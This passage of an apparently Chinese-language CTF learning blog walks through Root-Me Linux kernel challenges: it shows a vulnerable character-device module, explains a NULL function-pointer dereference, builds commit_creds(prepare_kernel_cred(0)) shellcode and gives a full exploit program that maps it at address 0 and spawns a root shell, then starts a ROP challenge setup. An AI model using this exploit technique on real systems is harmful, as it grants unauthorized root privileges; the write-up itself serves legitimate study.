class="number">0</span>; ; c = *s++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!ISASCII(c))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (ISDIGIT(c))</span><br><span class="line">            c -= <span class="string">'0'</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (ISALPHA(c))</span><br><span class="line">            c -= ISUPPER(c) ? <span class="string">'A'</span> - <span class="number">10</span> : <span class="string">'a'</span> - <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (c &gt;= base)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (any &lt; <span class="number">0</span> || acc &gt; cutoff || (acc == cutoff &amp;&amp; c &gt; cutlim))</span><br><span class="line">            any = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            any = <span class="number">1</span>;</span><br><span class="line">            acc *= base;</span><br><span class="line">            acc += c;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (any &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        acc = INT_MAX;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (neg)</span><br><span class="line">        acc = -acc;</span><br><span class="line">    <span class="keyword">if</span> (endptr != <span class="number">0</span>)</span><br><span class="line">        *((<span class="keyword">const</span> <span class="keyword">char</span> **)endptr) = any ? s - <span class="number">1</span> : nstr;</span><br><span class="line">    <span class="keyword">return</span> (acc);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">dev_t</span> first; <span class="comment">// Global variable for the first device number</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> <span class="title">c_dev</span>;</span> <span class="comment">// Global variable for the character device structure</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">class</span> *<span class="title">cl</span>;</span> <span class="comment">// Global variable for the device class</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tostring_s</span> &#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> pointer;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> pointer_max;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> *tostring_stack;</span><br><span class="line">  <span class="keyword">ssize_t</span> (*tostring_read)(struct file *f, <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *off); </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">tostring_s</span> *<span class="title">tostring</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> taille=<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">module_param(taille, <span class="keyword">int</span>,<span class="number">1</span>);</span><br><span class="line">MODULE_PARM_DESC(taille, <span class="string">"Stack size in Ko"</span>);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">tostring_open</span><span class="params">(struct inode *i, struct file *f)</span></span>&#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">"Tostring: open()\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">tostring_close</span><span class="params">(struct inode *i, struct file *f)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">"Tostring: close()\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">tostring_read</span><span class="params">(struct file *f, <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *off)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">"Tostring: read()\n"</span>);</span><br><span class="line">  <span class="keyword">return</span>((tostring-&gt;tostring_read)(f, buf, len, off)); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">tostring_read_hexa</span><span class="params">(struct file *f, <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *off)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">"Tostring: read_hexa()\n"</span>);</span><br><span class="line">  <span class="keyword">if</span> (tostring-&gt;pointer &gt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span>(<span class="built_in">snprintf</span>(buf,len,<span class="string">"%16llx\n"</span>,tostring-&gt;tostring_stack[--(tostring-&gt;pointer)]));</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">tostring_create</span><span class="params">(<span class="keyword">int</span> tl)</span> </span>&#123;</span><br><span class="line">  <span class="comment">/*  tostring=kmalloc(sizeof(struct tostring_s), GFP_DMA); */</span></span><br><span class="line">  taille=tl;</span><br><span class="line">  tostring-&gt;tostring_stack=kmalloc(taille*<span class="number">1024</span>, GFP_DMA);</span><br><span class="line">  <span class="keyword">if</span> (tostring-&gt;tostring_stack == <span class="literal">NULL</span>) <span class="keyword">return</span>(<span class="number">-1</span>);</span><br><span class="line">  tostring-&gt;pointer_max=(taille*<span class="number">1024</span>)/<span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span>);</span><br><span class="line">  tostring-&gt;tostring_read= tostring_read_hexa;</span><br><span class="line">  printk(KERN_INFO <span class="string">"Tostring: Stack size: %dK, locate at %p, max index: %d\n"</span>,taille,tostring-&gt;tostring_stack,tostring-&gt;pointer_max);</span><br><span class="line">  <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">tostring_read_dec</span><span class="params">(struct file *f, <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *off)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">"Tostring: read_dec()\n"</span>);</span><br><span class="line">  <span class="keyword">if</span> (tostring-&gt;pointer &gt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span>(<span class="built_in">snprintf</span>(buf,len,<span class="string">"%lld\n"</span>,tostring-&gt;tostring_stack[--(tostring-&gt;pointer)]));</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">tostring_write</span><span class="params">(struct file *f, <span class="keyword">const</span> <span class="keyword">char</span> __user *buf,<span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *off)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">char</span> *bufk;</span><br><span class="line">  <span class="keyword">int</span> i,j;</span><br><span class="line"></span><br><span class="line">  printk(KERN_INFO <span class="string">"Tostring: write()\n"</span>);</span><br><span class="line">  <span class="comment">// rajout du 0 final</span></span><br><span class="line">  bufk = kmalloc(len + <span class="number">1</span>, GFP_DMA);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (bufk)&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(bufk, buf, len))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"> </span><br><span class="line">    bufk[len] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">    i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i &lt;len) &#123;</span><br><span class="line">    <span class="comment">/* Les commandes commencent par 10 '*' */</span></span><br><span class="line">      <span class="keyword">for</span> (j=<span class="number">0</span>;(j&lt;<span class="number">10</span>) &amp;&amp; (bufk[j]==<span class="string">'*'</span>);j++);</span><br><span class="line">      <span class="keyword">if</span> (j == <span class="number">10</span>) &#123;</span><br><span class="line">	<span class="keyword">for</span> (j=i+<span class="number">10</span>;(bufk[j]!=<span class="string">'\0'</span>) &amp;&amp; (bufk[j] != <span class="string">'\n'</span>);j++);</span><br><span class="line">	bufk[j]=<span class="string">'\0'</span>;</span><br><span class="line">	printk(<span class="string">"Tostring: Cmd %s\n"</span>,bufk+i+<span class="number">10</span>);</span><br><span class="line">	<span class="keyword">switch</span>(bufk[i+<span class="number">10</span>]) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'H'</span>: </span><br><span class="line">	  tostring-&gt;tostring_read= tostring_read_hexa;</span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'D'</span>:</span><br><span class="line">	  tostring-&gt;tostring_read= tostring_read_dec;</span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'S'</span>:</span><br><span class="line">	  printk(<span class="string">"Tostring: Delete stack\n"</span>);</span><br><span class="line">	  kfree(tostring-&gt;tostring_stack);</span><br><span class="line">	  tostring-&gt;tostring_stack=<span class="literal">NULL</span>;</span><br><span class="line">	  tostring-&gt;tostring_read=<span class="literal">NULL</span>;</span><br><span class="line">	  tostring-&gt;pointer=<span class="number">0</span>;</span><br><span class="line">	  tostring-&gt;pointer_max=<span class="number">0</span>;</span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'N'</span>:</span><br><span class="line">	  printk(<span class="string">"Tostring: Stack create with size %ld\n"</span>,local_strtoul(bufk+i+<span class="number">11</span>,<span class="literal">NULL</span>,<span class="number">10</span>));</span><br><span class="line">	  <span class="keyword">if</span> (tostring-&gt;tostring_stack==<span class="literal">NULL</span>) tostring_create(local_strtoul(bufk+i+<span class="number">11</span>,<span class="literal">NULL</span>,<span class="number">10</span>));</span><br><span class="line">	  <span class="keyword">if</span> (tostring-&gt;tostring_stack==<span class="literal">NULL</span>) printk(<span class="string">"Tostring: Error, impossible to create stack\n"</span>);</span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	i=j+<span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">	printk(<span class="string">"tostring: insertion %lld\n"</span>,*((<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> *) (bufk+i)));</span><br><span class="line">	<span class="keyword">if</span> (tostring-&gt;pointer &gt;= tostring-&gt;pointer_max) </span><br><span class="line">	  printk(KERN_INFO <span class="string">"Tostring: Stack full\n"</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	  tostring-&gt;tostring_stack[(tostring-&gt;pointer)++]= *((<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> *) (bufk+i));</span><br><span class="line">	i = i+<span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  kfree(bufk);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> len;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">pugs_fops</span> =</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  .owner = THIS_MODULE,</span><br><span class="line">  .<span class="built_in">open</span> = tostring_open,</span><br><span class="line">  .<span class="built_in">release</span> = tostring_close,</span><br><span class="line">  .<span class="built_in">read</span> = tostring_read,</span><br><span class="line">  .<span class="built_in">write</span> = tostring_write,</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">tostring_init</span><span class="params">(<span class="keyword">void</span>)</span> <span class="comment">/* Constructor */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">"Tostring registered"</span>);</span><br><span class="line">  tostring=kmalloc(<span class="keyword">sizeof</span>(struct tostring_s), GFP_DMA);</span><br><span class="line">  tostring_create(taille);</span><br><span class="line">  <span class="keyword">if</span> (alloc_chrdev_region(&amp;first, <span class="number">0</span>, <span class="number">8</span>, <span class="string">"tostring"</span>) &lt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ((cl = class_create(THIS_MODULE, <span class="string">"chardrv"</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    unregister_chrdev_region(first, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (device_create(cl, <span class="literal">NULL</span>, first, <span class="literal">NULL</span>, <span class="string">"tostring"</span>) == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">"Tostring error"</span>);</span><br><span class="line">    class_destroy(cl);</span><br><span class="line">    unregister_chrdev_region(first, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  cdev_init(&amp;c_dev, &amp;pugs_fops);</span><br><span class="line">  <span class="keyword">if</span> (cdev_add(&amp;c_dev, first, <span class="number">1</span>) == <span class="number">-1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    device_destroy(cl, first);</span><br><span class="line">    class_destroy(cl);</span><br><span class="line">    unregister_chrdev_region(first, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  printk(KERN_INFO <span class="string">"&lt;Major, Minor&gt;: &lt;%d, %d&gt;\n"</span>, MAJOR(first), MINOR(first));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">tostring_exit</span><span class="params">(<span class="keyword">void</span>)</span> <span class="comment">/* Destructor */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">"Tostring unregistered"</span>);</span><br><span class="line">    kfree(tostring-&gt;tostring_stack);</span><br><span class="line">    unregister_chrdev_region(first, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">module_init(tostring_init);</span><br><span class="line">module_exit(tostring_exit);</span><br><span class="line"> </span><br><span class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">"F.Boisson"</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">"Module Tostring Integers Dec/Hex"</span>);</span><br></pre></td></tr></table></figure>

<p>重要需要注意一下两个函数：tostring_read和tostring_write</p>
<h5 id="read-1"><a href="#read-1" class="headerlink" title="read"></a>read</h5><ol>
<li>打印字符串<code>Tostring: read()\n</code></li>
<li>调用函数<code>tostring-&gt;tostring_read</code></li>
</ol>
<h5 id="write-1"><a href="#write-1" class="headerlink" title="write"></a>write</h5><ol>
<li>打印字符串<code>Tostring: write()\n</code></li>
<li>kmalloc申请chunk</li>
<li>将输入的内容送入chunk</li>
<li>末尾置<code>\0</code></li>
<li>比较前十个字符，是否都为<code>*</code></li>
<li>接着比较第11个字符，是否为<code>H\D\S\N</code>，分别调用不同的功能<ul>
<li>H：<code>tostring-&gt;tostring_read</code>设为<code>tostring_read_hexa</code></li>
<li>D：<code>tostring-&gt;tostring_read</code>设为<code>tostring_read_dec</code></li>
<li>S：清空数据<ul>
<li><code>tostring-&gt;tostring_read</code>设为null</li>
</ul>
</li>
<li>N：初始化</li>
</ul>
</li>
</ol>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><ol>
<li>由于init中有如下指令，故最低可以将mmap映射到0地址。</li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/vm/mmap_min_addr</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>若将shellcode通过memcpy函数放入0地址</li>
<li>那么在S清空栈的时候，<code>tostring-&gt;tostring_read</code>被设置为null【NULL在Linux中的定义（/usr/include/linux/stddef.h）：#define NULL 0；#define NULL ((void *)0)C++中NULL为0，而Linux C中，NULL为地址0所指向的内容。 】</li>
<li>再次执行read时候，<code>tostring-&gt;tostring_read</code>会执行0地址中的内容，即可get shell</li>
</ol>
<h5 id="编写shellcode"><a href="#编写shellcode" class="headerlink" title="编写shellcode"></a>编写shellcode</h5><p>目标是调用<code>commit_creds(prepare_kernel_cred(0))</code>，故可编写如下汇编执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xor eax,eax;</span><br><span class="line">call commit_creds;</span><br><span class="line">call prepare_kernel_cred;</span><br><span class="line">ret;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/05/kernel-study/image-20210604144540167.png" alt="image-20210604144540167"></p>
<p>有因为commit_creds和prepare_kernel_cred地址已知</p>
<blockquote>
<p>eax是参数？</p>
<p>所以一开始<code>xor eax,eax;</code>将commit_creds参数置零，它的结果放入eax中，作为prepare_kernel_cred的参数，即执行了<code>commit_creds(prepare_kernel_cred(0))</code></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xor eax,eax;</span><br><span class="line">call 0xC10711F0;</span><br><span class="line">call 0xC1070E80; </span><br><span class="line">ret;</span><br></pre></td></tr></table></figure>

<p>通过<code>Radare2</code>，生成对应的shellcode</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~/nullpoint$ rasm2 "xor eax,eax ; call 0xC10711F0 ; call 0xC1070E80 ; ret;"</span><br><span class="line">31c0e8e91107c1e8740e07c1c3</span><br></pre></td></tr></table></figure>

<p>对应的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> payload[] = <span class="string">"\x31\xc0\xe8\xe9\x11\x07\xc1\xe8\x74\x0e\x07\xc1\xc3"</span>;</span><br></pre></td></tr></table></figure>

<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> payload[] = <span class="string">"\x31\xc0\xe8\xe9\x11\x07\xc1\xe8\x74\x0e\x07\xc1\xc3"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> Get_shell[<span class="number">20</span>] ; </span><br><span class="line">    mmap(<span class="number">0</span>, <span class="number">4096</span>, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(<span class="number">0</span>, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line">    <span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/dev/tostring"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">write</span>(fd,<span class="string">"**********S"</span>,<span class="number">11</span>);</span><br><span class="line">    <span class="built_in">read</span>(fd,Get_shell,<span class="keyword">sizeof</span>(Get_shell));</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/05/kernel-study/image-20210604174655495.png" alt="image-20210604174655495"></p>
<h5 id="调试信息-1"><a href="#调试信息-1" class="headerlink" title="调试信息"></a>调试信息</h5><p><img src="/2021/06/05/kernel-study/image-20210604144933474.png" alt="image-20210604144933474"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add-symbol-file tostring.ko 0xC8824000 -s .data 0xC88247E0 -s .bss 0xC8824A80</span><br></pre></td></tr></table></figure>

<h3 id="3-Root-Me-LinKern-x86-basic-ROP"><a href="#3-Root-Me-LinKern-x86-basic-ROP" class="headerlink" title="3.[Root-Me]LinKern x86 - basic ROP"></a>3.[Root-Me]LinKern x86 - basic ROP</h3><h4 id="下载文件-2"><a href="#下载文件-2" class="headerlink" title="下载文件"></a>下载文件</h4><p><a href="https://www.root-me.org/en/Challenges/App-System/LinKern-x86-basic-ROP" target="_blank" rel="noopener">下载地址</a></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 2223 app-systeme-ch39@challenge03.root-me.org </span><br><span class="line">密码:	app-systeme-ch39</span><br></pre></td></tr></table></figure>

<p>拷贝文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">scp -P 2223 app-systeme-ch39@challenge03.root-me.org:/challenge/app-systeme/ch39/* .</span><br><span class="line">密码:	app-systeme-ch39</span><br></pre></td></tr></table></figure>

<h4 id="预备"><a href="#预备" class="headerlink" title="预备"></a>预备</h4><ol>
<li><p>解压img的脚本first.sh</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">mv initramfs.img initramfs.img.gz</span><br><span class="line">gunzip initramfs.img.gz</span><br><span class="line">mkdir initramfs</span><br><span class="line">cd initramfs</span><br><span class="line">cpio -idvm &lt; ../initramfs.img</span><br></pre></td></tr></table></figure>
</li>
<li><p>编译c文件并放入img，启动qemu的脚本second.sh</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">gcc -m32 -static -o exp exp.c</span><br><span class="line">cp exp.c initramfs</span><br><span class="line">cp exp initramfs</span><br><span class="line">cd initramfs</span><br><span class="line">find . | cpio -H newc -o &gt; ../initramfs.img</span><br><span class="line">cd ..</span><br><span class="line">./start.sh</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>3.调试模块基址</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add-symbol-file ./initramfs/lib/modules/4.10.3/rootme/ch39.ko 0xc8824000 -s .bss 0xc8824440 -s .data 0xc88241a0</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/05/kernel-study/image-20210604203258087.png" alt="image-20210604203258087"></p>
<p>4.启动文件start.sh</p>
<blockquote>
<p>根据隐藏文件改编</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">app-systeme-ch39@challenge03:~$ cat ._start_vm </span><br><span class="line"><span class="comment">#!/bin/bash -p</span></span><br><span class="line"></span><br><span class="line">PATH=/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">CHALLPATH=/challenge/app-systeme/ch39</span><br><span class="line"></span><br><span class="line">STTY=$(stty -g)</span><br><span class="line">stty intr ^-</span><br><span class="line"></span><br><span class="line">TEMP=$(mktemp -d)</span><br><span class="line">chgrp app-systeme-ch39 <span class="variable">$&#123;TEMP&#125;</span></span><br><span class="line">chmod 770 <span class="variable">$&#123;TEMP&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">""</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"A share will be available: host:<span class="variable">$&#123;TEMP&#125;</span> -&gt; guest:/mnt/share"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Launching the vulnerable machine..."</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">""</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line"> -m 32M \</span><br><span class="line"> -cpu kvm64,+smep,check \</span><br><span class="line"> -nographic \</span><br><span class="line"> -kernel <span class="variable">$CHALLPATH</span>/bzImage \</span><br><span class="line"> -append <span class="string">'console=ttyS0 loglevel=3 oops=panic panic=1'</span> \</span><br><span class="line"> -monitor /dev/null \</span><br><span class="line"> -initrd <span class="variable">$CHALLPATH</span>/initramfs.img \</span><br><span class="line"> -snapshot \</span><br><span class="line"> -hda <span class="variable">$CHALLPATH</span>/passwd.img \</span><br><span class="line"> -fsdev <span class="built_in">local</span>,id=exp1,path=<span class="variable">$&#123;TEMP&#125;</span>,security_model=mapped -device virtio-9p-pci,fsdev=exp1,mount_tag=rootme</span><br><span class="line"></span><br><span class="line">rm -rf <span class="string">"<span class="variable">$&#123;TEMP&#125;</span>"</span> 2&gt; /dev/null</span><br><span class="line">stty <span class="string">"<span class="variable">$&#123;STTY&#125;</span>"</span></span><br></pre></td></tr></table></figure>
</blockquote>
